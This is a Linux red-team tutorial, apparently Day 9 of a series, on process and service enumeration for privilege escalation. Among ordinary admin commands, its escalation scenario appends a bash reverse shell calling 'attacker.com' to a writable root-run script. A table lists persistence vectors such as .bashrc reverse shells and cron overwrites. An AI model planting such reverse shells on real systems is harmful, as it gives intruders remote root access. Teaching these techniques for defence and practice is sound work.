# Day 9 – Processes, Services & Enumeration
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

Linux systems run thousands of processes and services — and every single one is a potential **attack surface** or **persistence point**.

---

## 🧠 What Is a Process?

A process is a running instance of a command or application. You can list, monitor, or kill processes — or abuse them.

Run:
```bash
ps aux
```
## 🔧 Key Commands
| Command                | Purpose                            |
| ---------------------- | ---------------------------------- |
| `ps aux`               | List all system processes          |
| `top`                  | Real-time CPU/mem monitor          |
| `htop`                 | Enhanced top UI (needs install)    |
| `systemctl list-units` | List running services              |
| `systemctl status`     | View status/details of a service   |
| `ss -tuln`             | Show open ports/listening services |

## 🔍 Process Enumeration for Hackers
When you compromise a box, use:
```
ps aux | grep -v nobody
```

Things to look for:   
- Processes running as root
- Scripts with full paths (/home/user/script.py)   
- Sensitive args (e.g., mysql -u root -p<password>)   
- Writable scripts or binaries owned by root   
- Cron jobs or background services (systemctl, crontab, /etc/init.d/)   

## ⚠️ Real-World Escalation Scenario
1- Find a process:
```
python3 /opt/app/server.py
```

2- Check permissions:
```
ls -l /opt/app/server.py
```

3- If writable:
```
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /opt/app/server.py
```

4- Wait for service restart or trigger it with:
```
sudo systemctl restart server
```

## 🧪 Task of the Day
1- List running processes and highlight those owned by root
```
ps aux | grep root
```

2- Install and use htop for visualization:
```
sudo apt install htop
htop
```

3- Enumerate services:
```
systemctl list-units --type=service
```

4- Find writable or poorly configured services/scripts

## 🔐 Red Team Notes

| Vector                          | Example                     |
| ------------------------------- | --------------------------- |
| Writable service script         | Escalate on service restart |
| Credential in command-line args | Leak via `ps`               |
| Reverse shell in `.bashrc`      | Triggered by login shell    |
| Cron job overwrite              | Persistence                 |

📡 Learn real-world privilege escalation at:   
➡️ https://t.me/cybersecplayground


---

Be ready for **Day 10**, where we’ll dive into **cron jobs** and how they can be exploited or used for persistence.

📡 Learn real red team tactics on [@cybersecplayground](https://t.me/cybersecplayground)

#linux #privilegeescalation #processes #systemctl #redteam #hacking
